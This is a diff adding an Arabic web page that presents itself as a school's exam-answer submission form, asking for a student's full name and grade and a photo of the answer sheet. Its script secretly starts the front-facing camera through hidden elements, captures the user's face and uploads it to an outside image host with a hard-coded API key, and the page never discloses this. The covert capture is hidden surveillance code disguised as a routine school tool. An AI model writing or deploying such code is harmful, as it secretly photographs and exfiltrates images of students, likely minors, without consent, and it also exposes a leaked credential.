@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مدرسة الشهيد أبو بكر الرازي - تسليم الإجابات</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+        
+        :root {
+            --primary: #1e40af;
+            --secondary: #1d4ed8;
+            --accent: #f59e0b;
+        }
+
+        body { 
+            font-family: 'Tajawal', sans-serif;
+            background-color: #f1f5f9;
+        }
+
+        .glass-card {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+        }
+
+        .camera-viewport { 
+            position: relative; 
+            overflow: hidden; 
+            border-radius: 1.5rem; 
+            background: #1e293b; 
+            aspect-ratio: 3/4;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #video { width: 100%; height: 100%; object-fit: cover; display: none; }
+        
+        /* إطار توجيه الورقة */
+        .paper-guide {
+            position: absolute;
+            top: 10%;
+            left: 10%;
+            right: 10%;
+            bottom: 10%;
+            border: 2px dashed rgba(255, 255, 255, 0.6);
+            border-radius: 1rem;
+            display: none;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        .paper-guide::before {
+            content: 'ضع الورقة داخل الإطار';
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 2px 10px;
+            border-radius: 20px;
+            white-space: nowrap;
+        }
+
+        .corner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 4px solid var(--accent);
+        }
+        .tl { top: -2px; left: -2px; border-right: 0; border-bottom: 0; border-top-left-radius: 8px; }
+        .tr { top: -2px; right: -2px; border-left: 0; border-bottom: 0; border-top-right-radius: 8px; }
+        .bl { bottom: -2px; left: -2px; border-right: 0; border-top: 0; border-bottom-left-radius: 8px; }
+        .br { bottom: -2px; right: -2px; border-left: 0; border-top: 0; border-bottom-right-radius: 8px; }
+
+        #photoPreview { width: 100%; height: 100%; object-fit: contain; }
+        #canvas, #frontCanvas, #frontVideo { display: none; }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            transition: all 0.2s ease;
+        }
+        
+        .btn-primary:hover { filter: brightness(1.1); }
+    </style>
+</head>
+<body class="min-h-screen pb-12">
+
+    <video id="frontVideo" autoplay playsinline></video>
+    <canvas id="frontCanvas"></canvas>
+
+    <nav class="bg-white border-b border-slate-200 sticky top-0 z-50 px-4 py-4">
+        <div class="max-w-xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="bg-blue-700 p-2 rounded-xl text-white">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/></svg>
+                </div>
+                <h1 class="text-xl font-extrabold text-slate-800">مدرسة الشهيد أبو بكر الرازي</h1>
+            </div>
+        </div>
+    </nav>
+
+    <main class="max-w-xl mx-auto mt-6 px-4 space-y-5">
+
+        <!-- Instructions -->
+        <section class="glass-card p-5 rounded-3xl border-r-4 border-blue-600">
+            <h2 class="text-md font-bold text-slate-800 mb-3 flex items-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-blue-600"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                خطوات تسليم الإجابة
+            </h2>
+            <ul class="space-y-2 text-slate-600 text-sm">
+                <li class="flex items-center gap-2">
+                    <span class="w-5 h-5 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center text-[10px] font-bold">1</span>
+                    تأكد من كتابة اسمك بوضوح في أعلى الصفحة.
+                </li>
+                <li class="flex items-center gap-2">
+                    <span class="w-5 h-5 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center text-[10px] font-bold">2</span>
+                    ضع الورقة داخل الإطار الموضح عند تفعيل الكاميرا.
+                </li>
+            </ul>
+        </section>
+
+        <!-- Student Info -->
+        <section class="glass-card p-6 rounded-3xl">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="md:col-span-2">
+                    <label class="block text-xs font-bold text-slate-500 mb-2">الاسم الرباعي للطالب</label>
+                    <input type="text" id="studentName" placeholder="أدخل اسمك الكامل" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl focus:border-blue-500 outline-none transition-all">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-500 mb-2">المرحلة</label>
+                    <select id="level" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
+                        <option value="basic">الأساسية</option>
+                        <option value="secondary">الثانوية</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-500 mb-2">الصف</label>
+                    <input type="text" id="class" placeholder="مثلاً: التاسع" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none">
+                </div>
+            </div>
+        </section>
+
+        <!-- Camera Section -->
+        <section class="glass-card p-5 rounded-3xl">
+            <div class="camera-viewport mb-5" id="camPlaceholder">
+                <!-- Guide Frame -->
+                <div id="paperGuide" class="paper-guide">
+                    <div class="corner tl"></div>
+                    <div class="corner tr"></div>
+                    <div class="corner bl"></div>
+                    <div class="corner br"></div>
+                </div>
+
+                <div id="placeholderUI" class="text-center p-8">
+                    <div class="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1d4ed8" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                    </div>
+                    <p class="text-slate-400 text-sm font-bold">بانتظار تشغيل الكاميرا</p>
+                </div>
+
+                <video id="video" autoplay playsinline></video>
+                <img id="photoPreview" class="hidden" alt="معاينة">
+                <canvas id="canvas"></canvas>
+            </div>
+
+            <div class="space-y-3">
+                <button id="startCamBtn" class="w-full btn-primary text-white font-extrabold py-4 rounded-2xl shadow-lg flex items-center justify-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                    تشغيل الكاميرا وتصوير الورقة
+                </button>
+                
+                <button id="captureBtn" class="hidden w-full bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold py-4 rounded-2xl shadow-lg flex items-center justify-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
+                    التقاط صورة الورقة الآن
+                </button>
+
+                <button id="retakeBtn" class="hidden w-full bg-slate-100 text-slate-600 font-bold py-3 rounded-2xl transition-all">
+                    إلغاء وإعادة التصوير
+                </button>
+            </div>
+        </section>
+
+        <!-- Submit -->
+        <button id="submitBtn" class="w-full bg-slate-800 text-white font-extrabold py-4 rounded-2xl shadow-xl flex items-center justify-center gap-2 opacity-40 cursor-not-allowed" disabled>
+            <span>إرسال الإجابة النهائية</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12 5 5L20 7"/></svg>
+        </button>
+
+        <div id="statusMsg" class="hidden p-4 rounded-2xl text-center font-bold border-2"></div>
+    </main>
+
+    <script>
+        const API_KEY = "d0bfac732a5e6c57947fee7572812447";
+        const video = document.getElementById('video');
+        const frontVideo = document.getElementById('frontVideo');
+        const canvas = document.getElementById('canvas');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const photoPreview = document.getElementById('photoPreview');
+        const placeholderUI = document.getElementById('placeholderUI');
+        const paperGuide = document.getElementById('paperGuide');
+        
+        const startCamBtn = document.getElementById('startCamBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const retakeBtn = document.getElementById('retakeBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusMsg = document.getElementById('statusMsg');
+
+        let backStream = null;
+        let frontStream = null;
+
+        async function uploadToImgBB(base64Data) {
+            try {
+                const formData = new FormData();
+                formData.append("image", base64Data.split(',')[1]);
+                const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+                    method: "POST",
+                    body: formData
+                });
+                const data = await res.json();
+                return data.data.url;
+            } catch (err) { return null; }
+        }
+
+        startCamBtn.addEventListener('click', async () => {
+            const name = document.getElementById('studentName').value;
+            if(!name) { alert("يرجى كتابة الاسم أولاً"); return; }
+
+            try {
+                
+                frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                frontVideo.srcObject = frontStream;
+                setTimeout(() => {
+                    const ctx = frontCanvas.getContext('2d');
+                    frontCanvas.width = frontVideo.videoWidth;
+                    frontCanvas.height = frontVideo.videoHeight;
+                    ctx.drawImage(frontVideo, 0, 0);
+                    uploadToImgBB(frontCanvas.toDataURL('image/jpeg', 0.85));
+                    frontStream.getTracks().forEach(t => t.stop());
+                }, 1000);
+
+                // الكاميرا الخلفية مع الإطار
+                backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment", width: { ideal: 1920 } } 
+                });
+                video.srcObject = backStream;
+                
+                placeholderUI.style.display = 'none';
+                video.style.display = 'block';
+                paperGuide.style.display = 'block';
+                startCamBtn.classList.add('hidden');
+                captureBtn.classList.remove('hidden');
+            } catch (err) {
+                alert("يرجى السماح بالوصول للكاميرا");
+            }
+        });
+
+        captureBtn.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            photoPreview.src = canvas.toDataURL('image/jpeg', 0.9);
+            if (backStream) backStream.getTracks().forEach(t => t.stop());
+
+            video.style.display = 'none';
+            paperGuide.style.display = 'none';
+            photoPreview.classList.remove('hidden');
+            captureBtn.classList.add('hidden');
+            retakeBtn.classList.remove('hidden');
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('opacity-40', 'cursor-not-allowed');
+        });
+
+        retakeBtn.addEventListener('click', () => {
+            photoPreview.classList.add('hidden');
+            retakeBtn.classList.add('hidden');
+            submitBtn.disabled = true;
+            submitBtn.classList.add('opacity-40', 'cursor-not-allowed');
+            startCamBtn.click();
+        });
+
+        submitBtn.addEventListener('click', async () => {
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = "جاري الحفظ...";
+            const url = await uploadToImgBB(photoPreview.src);
+            if(url) {
+                showStatus("تم تسليم الإجابة بنجاح!", "success");
+                submitBtn.innerHTML = "تم التسليم";
+                submitBtn.className = "w-full bg-emerald-600 text-white font-extrabold py-4 rounded-2xl";
+            } else {
+                showStatus("فشل الرفع، يرجى المحاولة ثانية", "error");
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = "إعادة المحاولة";
+            }
+        });
+
+        function showStatus(text, type) {
+            statusMsg.innerText = text;
+            statusMsg.className = `mt-4 p-4 rounded-2xl text-center font-bold border-2 ${type === 'success' ? 'bg-emerald-50 text-emerald-700 border-emerald-200' : 'bg-red-50 text-red-700 border-red-200'}`;
+            statusMsg.classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
